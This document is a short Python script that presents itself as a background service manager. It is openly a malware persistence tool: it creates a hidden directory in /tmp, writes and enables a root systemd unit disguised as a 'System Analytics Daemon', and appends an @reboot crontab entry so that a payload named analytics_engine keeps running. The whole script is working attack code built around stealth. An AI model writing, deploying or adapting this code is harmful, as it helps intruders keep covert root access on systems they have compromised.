#!/usr/bin/env python3
"""
service_manager.py - Background Service Manager
Called by network scanner for monitoring services
"""

import os
import sys
import subprocess
import time

def setup_stealth_environment():
    """Setup stealth environment for persistence"""
    stealth_dir = "/tmp/.system-analytics"
    os.makedirs(stealth_dir, exist_ok=True)
    return stealth_dir

def deploy_persistence_mechanisms():
    """Deploy various persistence mechanisms"""
    stealth_dir = setup_stealth_environment()
    
    print("[+] Deploying persistence mechanisms...")
    
    # Systemd service deployment
    try:
        service_content = '''[Unit]
Description=System Analytics Daemon
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /tmp/.system-analytics/analytics_engine
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
'''
        
        with open("/etc/systemd/system/system-analytics.service", "w") as f:
            f.write(service_content)
        
        subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
        subprocess.run(["systemctl", "enable", "system-analytics.service"], capture_output=True)
        subprocess.run(["systemctl", "start", "system-analytics.service"], capture_output=True)
        print("[+] Systemd service deployed")
    except Exception as e:
        print(f"[-] Systemd deployment failed: {e}")
    
    # Cron persistence
    try:
        cron_cmd = "@reboot /usr/bin/python3 /tmp/.system-analytics/analytics_engine >/dev/null 2>&1"
        subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', 
                      shell=True, capture_output=True)
        print("[+] Cron persistence deployed")
    except Exception as e:
        print(f"[-] Cron deployment failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "deploy":
        deploy_persistence_mechanisms()
